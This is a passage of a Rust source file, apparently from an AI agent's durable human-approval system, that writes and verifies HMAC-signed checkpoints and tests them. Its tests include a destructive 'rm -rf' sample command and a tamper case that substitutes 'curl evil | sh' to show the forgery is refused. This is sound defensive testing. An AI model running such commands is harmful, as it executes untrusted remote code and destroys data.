//! Park-point checkpoints (spec 2026-07-10 durable-HITL §2.2–§2.3, E1/E6b):
//! written ONLY when an Ask parks; HMAC-SHA256 manifest keyed from the
//! daemon-local secret; refuse-on-corrupt; delete-on-answer.
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

pub const CHECKPOINT_VERSION: u32 = 1;

/// Serializable outcome of gating one call (index-parallel to the batch).
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub enum GateRecord {
    /// Policy-allowed or human-approved; resume rebuilds the ReadyCall
    /// WITHOUT re-prompting (spec §3.7).
    Ready,
    /// Denied / unknown tool / intent error; `content` is the final
    /// `ERROR: …` tool-result text.
    Rejected { content: String },
}

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct InvalidParked {
    pub id: String,
    pub name: String,
    pub error: String,
}

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct ParkedTurn {
    /// The turn's model text (display/debug; the message itself is already
    /// the last assistant entry in `context.history`).
    pub assistant_text: String,
    /// The turn's full parsed valid batch, post id-normalization.
    pub tool_calls: Vec<agent_tools::ToolCall>,
    /// Unparseable calls (re-seeded as per-call ERROR results on resume).
    pub invalid: Vec<InvalidParked>,
    /// Decisions for calls BEFORE the parked index (len == parked_index for
    /// gate-kind; len == tool_calls.len() for dispatch-kind).
    pub gate_records: Vec<GateRecord>,
    /// Some(i) ⇒ gate-kind park (blocked at call i's Ask). None ⇒
    /// dispatch-kind ancestor snapshot (whole batch gated; re-enter Phase 2).
    pub parked_index: Option<usize>,
    pub origin: Option<agent_policy::ApprovalOrigin>,
}

#[derive(Debug, Clone, Copy, PartialEq, Default, serde::Serialize, serde::Deserialize)]
pub struct Guardrails {
    pub tool_calls: u64,
    pub model_calls: u64,
}

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct Checkpoint {
    pub version: u32,
    pub session_id: String,
    /// [] = parent loop; ["<call_id>", ...] = path of dispatch call ids.
    pub subagent_path: Vec<String>,
    /// 0-based turn index the park happened in (resume continues at turn+1
    /// after replaying this one).
    pub turn: u64,
    pub context: crate::CuratedContextState,
    pub guardrails: Guardrails,
    pub parked: ParkedTurn,
}

#[derive(Debug, thiserror::Error)]
pub enum CheckpointError {
    #[error("checkpoint io: {0}")]
    Io(#[from] std::io::Error),
    #[error("checkpoint corrupt: {0}")]
    Corrupt(String),
    #[error("checkpoint version {found} unsupported (expected {CHECKPOINT_VERSION})")]
    Version { found: u32 },
}

fn hmac_sha256(key: &[u8; 32], data: &[u8]) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    let mut ikey = [0x36u8; 64];
    let mut okey = [0x5cu8; 64];
    for (i, b) in key.iter().enumerate() {
        ikey[i] ^= b;
        okey[i] ^= b;
    }
    let inner = Sha256::new()
        .chain_update(ikey)
        .chain_update(data)
        .finalize();
    Sha256::new()
        .chain_update(okey)
        .chain_update(inner)
        .finalize()
        .into()
}

fn sha256_hex(data: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    hex(&Sha256::digest(data))
}

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}

/// Constant-order compare is unnecessary here (local files, not a network
/// oracle), but keep it cheap and obvious.
fn mac_eq(a: &str, b: &str) -> bool {
    a.len() == b.len()
        && a.bytes()
            .zip(b.bytes())
            .fold(0u8, |acc, (x, y)| acc | (x ^ y))
            == 0
}

#[derive(serde::Serialize, serde::Deserialize)]
struct Manifest {
    version: u32,
    files: BTreeMap<String, String>,
    hmac: String,
}

#[derive(serde::Serialize, serde::Deserialize)]
struct Answer {
    approve: bool,
    mac: String,
}

fn create_dir_0700(dir: &Path) -> std::io::Result<()> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        match std::fs::DirBuilder::new()
            .recursive(true)
            .mode(0o700)
            .create(dir)
        {
            Ok(()) => Ok(()),
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => Ok(()),
            Err(e) => Err(e),
        }
    }
    #[cfg(not(unix))]
    std::fs::create_dir_all(dir)
}

/// Temp name appends the FULL filename (4A-1 collision gotcha); temp created
/// 0o600 so the rename never widens modes.
fn atomic_write_0600(path: &Path, bytes: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    let file_name = path
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidInput, "no filename"))?;
    let tmp = path.with_file_name(format!("{file_name}.tmp"));
    // A stale .tmp (e.g. from a prior wide-mode write, or a crash before
    // rename) must not survive into this write: an existing file at `tmp`
    // keeps its old mode across `OpenOptions::open` (mode() only applies on
    // create), so a pre-existing wide-mode temp would survive the rename.
    let _ = std::fs::remove_file(&tmp);
    let mut opts = std::fs::OpenOptions::new();
    opts.create(true).truncate(true).write(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let mut f = opts.open(&tmp)?;
    f.write_all(bytes)?;
    f.sync_all()?;
    drop(f);
    std::fs::rename(&tmp, path)
}

pub fn write_checkpoint(
    dir: &Path,
    key: &[u8; 32],
    chk: &Checkpoint,
    artifacts: &BTreeMap<String, BTreeMap<String, String>>,
) -> std::io::Result<()> {
    create_dir_0700(dir)?;
    create_dir_0700(&dir.join("artifacts"))?;
    let io_err = |e: serde_json::Error| std::io::Error::new(std::io::ErrorKind::InvalidData, e);
    let parked = serde_json::to_vec_pretty(chk).map_err(io_err)?;
    let mut files = BTreeMap::new();
    files.insert("parked.json".to_string(), sha256_hex(&parked));
    let mut writes: Vec<(PathBuf, Vec<u8>)> = vec![(dir.join("parked.json"), parked)];
    for (store, tree) in artifacts {
        let body = serde_json::to_vec_pretty(tree).map_err(io_err)?;
        files.insert(format!("artifacts/{store}.json"), sha256_hex(&body));
        writes.push((dir.join("artifacts").join(format!("{store}.json")), body));
    }
    let mac = hex(&hmac_sha256(
        key,
        &serde_json::to_vec(&files).map_err(io_err)?,
    ));
    let manifest = serde_json::to_vec_pretty(&Manifest {
        version: CHECKPOINT_VERSION,
        files,
        hmac: mac,
    })
    .map_err(io_err)?;
    for (path, bytes) in writes {
        atomic_write_0600(&path, &bytes)?;
    }
    // Manifest LAST: its presence marks a complete tree (a crash mid-write
    // leaves no manifest ⇒ load refuses as corrupt ⇒ spec §4 torn-tree row).
    atomic_write_0600(&dir.join("manifest.json"), &manifest)
}

pub fn has_park(dir: &Path) -> bool {
    dir.join("parked.json").exists()
}

fn verified_manifest(dir: &Path, key: &[u8; 32]) -> Result<Manifest, CheckpointError> {
    let bytes = std::fs::read(dir.join("manifest.json"))
        .map_err(|e| CheckpointError::Corrupt(format!("manifest unreadable: {e}")))?;
    let m: Manifest = serde_json::from_slice(&bytes)
        .map_err(|e| CheckpointError::Corrupt(format!("manifest parse: {e}")))?;
    let expect = hex(&hmac_sha256(
        key,
        &serde_json::to_vec(&m.files).map_err(|e| CheckpointError::Corrupt(e.to_string()))?,
    ));
    if !mac_eq(&expect, &m.hmac) {
        return Err(CheckpointError::Corrupt("HMAC mismatch".into()));
    }
    for (rel, want) in &m.files {
        let body = std::fs::read(dir.join(rel))
            .map_err(|e| CheckpointError::Corrupt(format!("{rel} unreadable: {e}")))?;
        if !mac_eq(&sha256_hex(&body), want) {
            return Err(CheckpointError::Corrupt(format!("{rel} hash mismatch")));
        }
    }
    Ok(m)
}

pub fn load_checkpoint(dir: &Path, key: &[u8; 32]) -> Result<Option<Checkpoint>, CheckpointError> {
    if !has_park(dir) {
        return Ok(None);
    }
    verified_manifest(dir, key)?;
    let bytes = std::fs::read(dir.join("parked.json"))?;
    // Version gate BEFORE full decode: future shapes may not deserialize.
    let head: serde_json::Value = serde_json::from_slice(&bytes)
        .map_err(|e| CheckpointError::Corrupt(format!("parked.json parse: {e}")))?;
    let found = head.get("version").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    if found != CHECKPOINT_VERSION {
        return Err(CheckpointError::Version { found });
    }
    serde_json::from_value(head)
        .map(Some)
        .map_err(|e| CheckpointError::Corrupt(format!("parked.json decode: {e}")))
}

pub fn load_artifact_dump(
    dir: &Path,
    key: &[u8; 32],
) -> Result<BTreeMap<String, BTreeMap<String, String>>, CheckpointError> {
    let m = verified_manifest(dir, key)?;
    let mut out = BTreeMap::new();
    for rel in m.files.keys() {
        if let Some(store) = rel
            .strip_prefix("artifacts/")
            .and_then(|s| s.strip_suffix(".json"))
        {
            let bytes = std::fs::read(dir.join(rel))?;
            let tree: BTreeMap<String, String> = serde_json::from_slice(&bytes)
                .map_err(|e| CheckpointError::Corrupt(format!("{rel}: {e}")))?;
            out.insert(store.to_string(), tree);
        }
    }
    Ok(out)
}

/// Delete this level's park (answer commit / turn completion). Children are
/// untouched — a still-parked child outlives its parent's answer.
pub fn clear_park(dir: &Path) {
    let _ = std::fs::remove_file(dir.join("parked.json"));
    let _ = std::fs::remove_file(dir.join("manifest.json"));
    let _ = std::fs::remove_dir_all(dir.join("artifacts"));
    let _ = std::fs::remove_file(dir.join("answer.json"));
}

fn answer_mac(key: &[u8; 32], approve: bool, manifest_hmac: &str) -> String {
    let mut data = vec![approve as u8];
    data.extend_from_slice(manifest_hmac.as_bytes());
    hex(&hmac_sha256(key, &data))
}

/// Restart-path answer commit (header note 3): durable, MAC-bound to the
/// exact park it answers. The resumed loop consumes it via `take_answer`.
pub fn write_answer(dir: &Path, key: &[u8; 32], approve: bool) -> std::io::Result<()> {
    let m = verified_manifest(dir, key)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e.to_string()))?;
    let a = Answer {
        approve,
        mac: answer_mac(key, approve, &m.hmac),
    };
    atomic_write_0600(
        &dir.join("answer.json"),
        &serde_json::to_vec(&a).expect("answer serializes"),
    )
}

/// Verify + consume the answer. Any verification failure ⇒ None (the ask is
/// re-prompted — fail closed, never fail open).
pub fn take_answer(dir: &Path, key: &[u8; 32]) -> Option<bool> {
    let bytes = std::fs::read(dir.join("answer.json")).ok()?;
    let _ = std::fs::remove_file(dir.join("answer.json"));
    let a: Answer = serde_json::from_slice(&bytes).ok()?;
    let m = verified_manifest(dir, key).ok()?;
    mac_eq(&a.mac, &answer_mac(key, a.approve, &m.hmac)).then_some(a.approve)
}

/// Path-component sanitizer for child checkpoint dirs (spec §2.3): keep
/// `[A-Za-z0-9._-]`, replace everything else with '-'; a leading dot (or a
/// name that becomes all dots, e.g. "..") is stripped so the joined path can
/// never escape the tree or hide as a dotfile; empty → "call".
pub fn sanitize_dir_key(call_id: &str) -> String {
    let out: String = call_id
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "._-".contains(c) {
                c
            } else {
                '-'
            }
        })
        .collect();
    // ".." would escape the tree even without '/' once joined recursively;
    // a leading dot also hides the dir. Neutralize both.
    let out = out.trim_start_matches('.').to_string();
    if out.is_empty() {
        "call".to_string()
    } else {
        out
    }
}

/// Recursive `ls`+`read` walk of one backend (NEVER `glob`, which caps at
/// `GLOB_MAX_RESULTS` — spec §2.3).
async fn dump_backend(b: &Arc<dyn agent_tools::backend::Backend>) -> BTreeMap<String, String> {
    let mut out = BTreeMap::new();
    let mut stack = vec![String::new()]; // "" = root
    while let Some(dir) = stack.pop() {
        let Ok(entries) = b.ls(&dir).await else {
            continue;
        };
        for e in entries {
            let path = if dir.is_empty() {
                e.name.clone()
            } else {
                format!("{dir}/{}", e.name)
            };
            if e.is_dir {
                stack.push(path);
            } else if let Ok(content) = b.read(&path).await {
                out.insert(path, content);
            }
        }
    }
    out
}

/// Dump both artifact stores through the Backend trait (recursive ls+read —
/// NEVER glob, which caps at 500; spec §2.3).
pub async fn dump_artifacts(
    a: &crate::SessionArtifacts,
) -> BTreeMap<String, BTreeMap<String, String>> {
    BTreeMap::from([
        ("results".to_string(), dump_backend(&a.results).await),
        ("history".to_string(), dump_backend(&a.history).await),
    ])
}

/// Restore a dump into fresh backends (spec §2.4 step 3).
pub async fn restore_artifacts(
    a: &crate::SessionArtifacts,
    dump: &BTreeMap<String, BTreeMap<String, String>>,
) {
    for (store, backend) in [("results", &a.results), ("history", &a.history)] {
        if let Some(tree) = dump.get(store) {
            for (path, content) in tree {
                let _ = backend.write(path, content).await;
            }
        }
    }
}

impl Checkpoint {
    /// The mechanical `Checkpoint → ResumeTurn` projection: the decision is
    /// injected separately by the caller (from a durable answer.json, or None
    /// to re-ask live). No verification here — the caller runs
    /// `verify_tally_floor` + manifest checks before building this.
    pub fn resume_turn(&self, parked_decision: Option<bool>) -> crate::ResumeTurn {
        crate::ResumeTurn {
            assistant_text: self.parked.assistant_text.clone(),
            tool_calls: self.parked.tool_calls.clone(),
            invalid: self.parked.invalid.clone(),
            gate_records: self.parked.gate_records.clone(),
            parked_index: self.parked.parked_index,
            parked_decision,
            turn: self.turn,
            guardrails: self.guardrails,
            goal_text: self
                .context
                .goal
                .as_ref()
                .map(|g| g.content.clone())
                .unwrap_or_default(),
        }
    }
}

/// Monotonic tally clamp (spec §2.4 step 3): the restored tally may never be
/// below what the checkpointed history implies. Implied floor = executed tool
/// results after the last user message (this run's earlier turns). Rejected /
/// invalid results in history also count `Role::Tool`, but never over-floor —
/// they were still gate outcomes this run; an over-strict floor errs toward
/// refuse, which is the fail-safe direction.
pub fn verify_tally_floor(chk: &Checkpoint) -> Result<(), CheckpointError> {
    let last_user = chk
        .context
        .history
        .iter()
        .rposition(|m| m.role == agent_model::Role::User);
    let implied = chk.context.history[last_user.map_or(0, |i| i + 1)..]
        .iter()
        .filter(|m| m.role == agent_model::Role::Tool)
        .count() as u64;
    if chk.guardrails.tool_calls < implied {
        return Err(CheckpointError::Corrupt(format!(
            "tool tally {} below history-implied floor {implied}",
            chk.guardrails.tool_calls
        )));
    }
    Ok(())
}

/// A dispatch-kind checkpoint waiting in memory (flushed only if a
/// descendant parks).
pub struct PendingSnapshot {
    pub context: crate::CuratedContextState,
    pub guardrails: Guardrails,
    pub turn: u64,
    pub assistant_text: String,
    pub tool_calls: Vec<agent_tools::ToolCall>,
    pub invalid: Vec<InvalidParked>,
    pub gate_records: Vec<GateRecord>,
    pub artifacts: Arc<crate::SessionArtifacts>,
}

/// Everything a loop needs to park and everything dispatch needs to derive
/// child checkpointers. Cheap to clone behind Arc.
pub struct Checkpointer {
    dir: PathBuf,
    key: [u8; 32],
    session_id: String,
    subagent_path: Vec<String>,
    origin: Option<agent_policy::ApprovalOrigin>,
    parent: Option<Arc<Checkpointer>>,
    /// Pre-Phase-2 snapshot for dispatch-bearing turns; memory-only unless a
    /// descendant parks (E1). Cleared at turn end.
    turn_snapshot: Mutex<Option<PendingSnapshot>>,
    /// True once this level flushed a dispatch-kind park this turn.
    flushed: AtomicBool,
    /// Asks currently blocked at a gate in THIS loop or any descendant
    /// (owner decision P2): incremented on self + every ancestor when a
    /// durable Ask starts waiting, decremented when it resolves. Dispatch
    /// disarms its deadline while a child's count is non-zero.
    waiting_asks: AtomicUsize,
}

impl Checkpointer {
    pub fn new(dir: PathBuf, key: [u8; 32], session_id: String) -> Arc<Self> {
        Arc::new(Self {
            dir,
            key,
            session_id,
            subagent_path: Vec::new(),
            origin: None,
            parent: None,
            turn_snapshot: Mutex::new(None),
            flushed: AtomicBool::new(false),
            waiting_asks: AtomicUsize::new(0),
        })
    }

    /// Child checkpointer for one dispatch call (header note 1: keyed by the
    /// parent's call id, which IS restart-stable).
    pub fn child(
        self: &Arc<Self>,
        call_id: &str,
        origin: agent_policy::ApprovalOrigin,
    ) -> Arc<Checkpointer> {
        let key_name = sanitize_dir_key(call_id);
        let mut path = self.subagent_path.clone();
        path.push(key_name.clone());
        Arc::new(Self {
            dir: self.dir.join("children").join(key_name),
            key: self.key,
            session_id: self.session_id.clone(),
            subagent_path: path,
            origin: Some(origin),
            parent: Some(self.clone()),
            turn_snapshot: Mutex::new(None),
            flushed: AtomicBool::new(false),
            waiting_asks: AtomicUsize::new(0),
        })
    }

    pub fn dir(&self) -> &Path {
        &self.dir
    }

    pub fn key(&self) -> &[u8; 32] {
        &self.key
    }

    pub fn session_id(&self) -> &str {
        &self.session_id
    }

    pub fn subagent_path(&self) -> &[String] {
        &self.subagent_path
    }

    pub fn origin(&self) -> Option<&agent_policy::ApprovalOrigin> {
        self.origin.as_ref()
    }

    pub fn set_turn_snapshot(&self, snap: PendingSnapshot) {
        *self.turn_snapshot.lock().unwrap() = Some(snap);
    }

    /// Turn completed: drop the memory snapshot; if it was flushed to disk
    /// this turn (a descendant parked), remove the dispatch-kind park.
    pub fn end_turn(&self) {
        *self.turn_snapshot.lock().unwrap() = None;
        if self.flushed.swap(false, Ordering::SeqCst) {
            clear_park(&self.dir);
        }
    }

    /// Gate-kind park write (spec §2.3): dumps artifacts, writes checkpoint,
    /// then flushes every ancestor's pending snapshot (dispatch-kind).
    pub async fn write_park(
        &self,
        chk: Checkpoint,
        artifacts: &crate::SessionArtifacts,
    ) -> std::io::Result<()> {
        let dump = dump_artifacts(artifacts).await;
        write_checkpoint(&self.dir, &self.key, &chk, &dump)?;
        self.flushed.store(true, Ordering::SeqCst);
        let mut anc = self.parent.clone();
        while let Some(a) = anc {
            a.flush_snapshot().await;
            anc = a.parent.clone();
        }
        Ok(())
    }

    /// Flush the pending dispatch-kind snapshot, once per turn. The snapshot
    /// is taken OUT of the mutex before any `.await` below — a MutexGuard
    /// must never cross an await point (same discipline as `RunShared::with`).
    async fn flush_snapshot(&self) {
        if self.flushed.load(Ordering::SeqCst) {
            return; // already on disk this turn (gate park or earlier child)
        }
        let snap = self.turn_snapshot.lock().unwrap().take();
        let Some(snap) = snap else { return };
        let chk = Checkpoint {
            version: CHECKPOINT_VERSION,
            session_id: self.session_id.clone(),
            subagent_path: self.subagent_path.clone(),
            turn: snap.turn,
            context: snap.context,
            guardrails: snap.guardrails,
            parked: ParkedTurn {
                assistant_text: snap.assistant_text,
                tool_calls: snap.tool_calls,
                invalid: snap.invalid,
                gate_records: snap.gate_records,
                parked_index: None, // dispatch-kind
                origin: self.origin.clone(),
            },
        };
        let dump = dump_artifacts(&snap.artifacts).await;
        if let Err(e) = write_checkpoint(&self.dir, &self.key, &chk, &dump) {
            tracing::warn!(target: "checkpoint", error = %e,
                "ancestor snapshot flush failed; restart resume may be partial");
            return;
        }
        self.flushed.store(true, Ordering::SeqCst);
    }

    /// Answer commit on the live path: delete this level's park.
    pub fn clear_park(&self) {
        clear_park(&self.dir);
        self.flushed.store(false, Ordering::SeqCst);
    }

    /// P2: mark an Ask as blocked here — the count propagates up so every
    /// enclosing dispatch call disarms its deadline while we wait. RAII so
    /// a cancelled/denied/dropped await always unwinds the count.
    pub fn enter_ask(self: &Arc<Self>) -> AskGuard {
        let mut node = Some(self.clone());
        let mut bumped = Vec::new();
        while let Some(n) = node {
            n.waiting_asks.fetch_add(1, Ordering::SeqCst);
            node = n.parent.clone();
            bumped.push(n);
        }
        AskGuard(bumped)
    }

    pub fn is_awaiting_ask(&self) -> bool {
        self.waiting_asks.load(Ordering::SeqCst) > 0
    }

    pub fn take_answer(&self) -> Option<bool> {
        take_answer(&self.dir, &self.key)
    }

    /// Load + verify a child's checkpoint (dispatch resume rebinding).
    pub fn load_child(&self, call_id: &str) -> Result<Option<Checkpoint>, CheckpointError> {
        load_checkpoint(
            &self.dir.join("children").join(sanitize_dir_key(call_id)),
            &self.key,
        )
    }

    pub fn child_artifact_dump(
        &self,
        call_id: &str,
    ) -> Result<BTreeMap<String, BTreeMap<String, String>>, CheckpointError> {
        load_artifact_dump(
            &self.dir.join("children").join(sanitize_dir_key(call_id)),
            &self.key,
        )
    }

    /// Remove a child's entire checkpoint dir (child finished).
    pub fn clear_child(&self, call_id: &str) {
        let _ = std::fs::remove_dir_all(self.dir.join("children").join(sanitize_dir_key(call_id)));
    }
}

/// Decrements every bumped node on drop (P2 unwind safety).
pub struct AskGuard(Vec<Arc<Checkpointer>>);
impl Drop for AskGuard {
    fn drop(&mut self) {
        for n in &self.0 {
            n.waiting_asks.fetch_sub(1, Ordering::SeqCst);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    fn key() -> [u8; 32] {
        [7u8; 32]
    }

    fn sample() -> Checkpoint {
        Checkpoint {
            version: CHECKPOINT_VERSION,
            session_id: "100-aabbccdd".into(),
            subagent_path: vec![],
            turn: 2,
            context: crate::CuratedContextState {
                goal: None,
                history: vec![agent_model::Message::user("hi")],
                compaction_summary: None,
                folded_facts: vec![],
                folded_sections: vec![],
                seq: 0,
                history_has_spans: false,
                history_incomplete: false,
                artifact_prefix: String::new(),
                todos: vec![],
            },
            guardrails: Guardrails {
                tool_calls: 3,
                model_calls: 2,
            },
            parked: ParkedTurn {
                assistant_text: "running".into(),
                tool_calls: vec![agent_tools::ToolCall {
                    id: "c1".into(),
                    name: "execute_command".into(),
                    args: serde_json::json!({"command": "rm -rf /tmp/x"}),
                }],
                invalid: vec![],
                gate_records: vec![],
                parked_index: Some(0),
                origin: None,
            },
        }
    }

    fn arts() -> BTreeMap<String, BTreeMap<String, String>> {
        let mut m = BTreeMap::new();
        m.insert(
            "results".to_string(),
            BTreeMap::from([("r1.md".to_string(), "big output".to_string())]),
        );
        m.insert("history".to_string(), BTreeMap::new());
        m
    }

    #[test]
    fn checkpoint_round_trips_with_artifacts() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        let back = load_checkpoint(dir.path(), &key()).unwrap().unwrap();
        assert_eq!(back, sample());
        let dump = load_artifact_dump(dir.path(), &key()).unwrap();
        assert_eq!(dump["results"]["r1.md"], "big output");
        assert!(!dir.path().join("parked.json.tmp").exists(), "atomic");
    }

    #[test]
    fn load_none_when_no_park() {
        let dir = tempfile::tempdir().unwrap();
        assert!(load_checkpoint(dir.path(), &key()).unwrap().is_none());
        assert!(!has_park(dir.path()));
    }

    #[test]
    fn verify_tally_floor_rejects_below_and_accepts_at_or_above() {
        // History: one user msg, then two tool results this run ⇒ implied
        // floor 2.
        let mut chk = sample();
        chk.context.history = vec![
            agent_model::Message::user("hi"),
            agent_model::Message::assistant("go", None),
            agent_model::Message::tool("c1", "execute_command", "ok"),
            agent_model::Message::tool("c2", "execute_command", "ok"),
        ];
        // Below the floor ⇒ Corrupt.
        chk.guardrails.tool_calls = 1;
        assert!(matches!(
            verify_tally_floor(&chk),
            Err(CheckpointError::Corrupt(_))
        ));
        // At the floor ⇒ Ok.
        chk.guardrails.tool_calls = 2;
        assert!(verify_tally_floor(&chk).is_ok());
        // Above the floor ⇒ Ok (earlier turns' tallies count too).
        chk.guardrails.tool_calls = 9;
        assert!(verify_tally_floor(&chk).is_ok());
    }

    #[test]
    fn verify_tally_floor_counts_only_after_last_user() {
        // A tool result BEFORE the last user message belongs to a prior run
        // segment and must NOT raise this run's floor.
        let mut chk = sample();
        chk.context.history = vec![
            agent_model::Message::user("first"),
            agent_model::Message::tool("old", "execute_command", "ok"),
            agent_model::Message::user("second"),
            agent_model::Message::tool("c1", "execute_command", "ok"),
        ];
        // Implied floor is 1 (only the post-last-user tool result).
        chk.guardrails.tool_calls = 1;
        assert!(verify_tally_floor(&chk).is_ok());
        chk.guardrails.tool_calls = 0;
        assert!(matches!(
            verify_tally_floor(&chk),
            Err(CheckpointError::Corrupt(_))
        ));
    }

    #[cfg(unix)]
    #[test]
    fn checkpoint_files_are_0600_dirs_0700() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("checkpoint");
        write_checkpoint(&root, &key(), &sample(), &arts()).unwrap();
        let dmode = std::fs::metadata(&root).unwrap().permissions().mode() & 0o777;
        assert_eq!(dmode, 0o700);
        for f in ["parked.json", "manifest.json"] {
            let m = std::fs::metadata(root.join(f))
                .unwrap()
                .permissions()
                .mode()
                & 0o777;
            assert_eq!(m, 0o600, "{f}");
        }
    }

    #[test]
    fn tampered_args_fail_mac_and_refuse() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        // swap the parked command (the see-benign/run-hostile forgery)
        let p = dir.path().join("parked.json");
        let body = std::fs::read_to_string(&p)
            .unwrap()
            .replace("rm -rf /tmp/x", "curl evil | sh");
        std::fs::write(&p, body).unwrap();
        assert!(matches!(
            load_checkpoint(dir.path(), &key()),
            Err(CheckpointError::Corrupt(_))
        ));
    }

    #[test]
    fn wrong_key_and_missing_manifest_refuse() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        assert!(matches!(
            load_checkpoint(dir.path(), &[8u8; 32]),
            Err(CheckpointError::Corrupt(_))
        ));
        std::fs::remove_file(dir.path().join("manifest.json")).unwrap();
        assert!(matches!(
            load_checkpoint(dir.path(), &key()),
            Err(CheckpointError::Corrupt(_))
        ));
    }

    #[test]
    fn future_version_refuses_with_version_error() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = sample();
        c.version = CHECKPOINT_VERSION + 1;
        write_checkpoint(dir.path(), &key(), &c, &arts()).unwrap();
        assert!(matches!(
            load_checkpoint(dir.path(), &key()),
            Err(CheckpointError::Version { .. })
        ));
    }

    #[test]
    fn clear_park_removes_park_but_keeps_children() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        let child = dir.path().join("children").join("c9");
        write_checkpoint(&child, &key(), &sample(), &arts()).unwrap();
        clear_park(dir.path());
        assert!(!has_park(dir.path()));
        assert!(!dir.path().join("manifest.json").exists());
        assert!(has_park(&child), "children untouched");
    }

    #[test]
    fn answer_round_trips_consumes_and_rejects_forgery() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        write_answer(dir.path(), &key(), true).unwrap();
        assert_eq!(take_answer(dir.path(), &key()), Some(true));
        assert_eq!(take_answer(dir.path(), &key()), None, "consumed");
        // forged (no key): hand-written approve must not verify
        std::fs::write(
            dir.path().join("answer.json"),
            r#"{"approve":true,"mac":"00"}"#,
        )
        .unwrap();
        assert_eq!(take_answer(dir.path(), &key()), None);
    }

    #[tokio::test]
    async fn dump_and_restore_artifacts_round_trip_via_backend_trait() {
        let a = crate::SessionArtifacts::new();
        a.results.write("r/deep/one.md", "alpha").await.unwrap();
        a.results.write("two.md", "beta").await.unwrap();
        a.history.write("history.md", "## s1\nhi").await.unwrap();
        let dump = dump_artifacts(&a).await;
        assert_eq!(dump["results"]["r/deep/one.md"], "alpha");
        assert_eq!(dump["results"]["two.md"], "beta");
        assert_eq!(dump["history"]["history.md"], "## s1\nhi");
        let b = crate::SessionArtifacts::new();
        restore_artifacts(&b, &dump).await;
        assert_eq!(b.results.read("r/deep/one.md").await.unwrap(), "alpha");
        assert_eq!(b.history.read("history.md").await.unwrap(), "## s1\nhi");
    }

    #[tokio::test]
    async fn child_park_flushes_ancestor_snapshot_and_end_turn_clears_it() {
        let dir = tempfile::tempdir().unwrap();
        let root = Checkpointer::new(dir.path().join("checkpoint"), key(), "s1".into());
        let arts = Arc::new(crate::SessionArtifacts::new());
        root.set_turn_snapshot(PendingSnapshot {
            context: sample().context,
            guardrails: Guardrails {
                tool_calls: 1,
                model_calls: 1,
            },
            turn: 0,
            assistant_text: "dispatching".into(),
            tool_calls: sample().parked.tool_calls,
            invalid: vec![],
            gate_records: vec![GateRecord::Ready],
            artifacts: arts.clone(),
        });
        // E1: snapshot alone writes NOTHING
        assert!(!root.dir().exists());

        let child = root.child(
            "call_1",
            agent_policy::ApprovalOrigin {
                delegation_id: "call_1".into(),
                subagent_name: "general-purpose".into(),
                depth: 1,
            },
        );
        let mut chk = sample();
        chk.subagent_path = vec!["call_1".into()];
        child
            .write_park(chk, &crate::SessionArtifacts::new())
            .await
            .unwrap();

        // child park present under children/<call_id>; ancestor flushed
        assert!(has_park(&root.dir().join("children").join("call_1")));
        assert!(has_park(root.dir()), "ancestor dispatch-kind park flushed");
        let parent = load_checkpoint(root.dir(), &key()).unwrap().unwrap();
        assert_eq!(parent.parked.parked_index, None, "dispatch-kind");
        assert_eq!(
            load_checkpoint(&root.dir().join("children/call_1"), &key())
                .unwrap()
                .unwrap()
                .subagent_path,
            vec!["call_1".to_string()]
        );

        // parent turn completes → its dispatch-kind park is removed,
        // child park untouched
        root.end_turn();
        assert!(!has_park(root.dir()));
        assert!(has_park(&root.dir().join("children").join("call_1")));
        // second end_turn is a no-op
        root.end_turn();
    }

    #[tokio::test]
    async fn grandchild_checkpointers_nest_recursively() {
        // E6a: grandchild composition covered at unit level.
        let dir = tempfile::tempdir().unwrap();
        let root = Checkpointer::new(dir.path().join("checkpoint"), key(), "s1".into());
        let child = root.child(
            "call_a",
            agent_policy::ApprovalOrigin {
                delegation_id: "call_a".into(),
                subagent_name: "x".into(),
                depth: 1,
            },
        );
        let grand = child.child(
            "call_b",
            agent_policy::ApprovalOrigin {
                delegation_id: "sub1:call_b".into(),
                subagent_name: "y".into(),
                depth: 2,
            },
        );
        assert_eq!(
            grand.subagent_path(),
            ["call_a".to_string(), "call_b".to_string()]
        );
        // give BOTH ancestors a pending turn snapshot (as the loop would on
        // a dispatch-bearing turn) so the flush cascade is assertable
        let snap = || PendingSnapshot {
            context: sample().context,
            guardrails: Guardrails::default(),
            turn: 0,
            assistant_text: String::new(),
            tool_calls: vec![],
            invalid: vec![],
            gate_records: vec![],
            artifacts: Arc::new(crate::SessionArtifacts::new()),
        };
        root.set_turn_snapshot(snap());
        child.set_turn_snapshot(snap());
        let mut chk = sample();
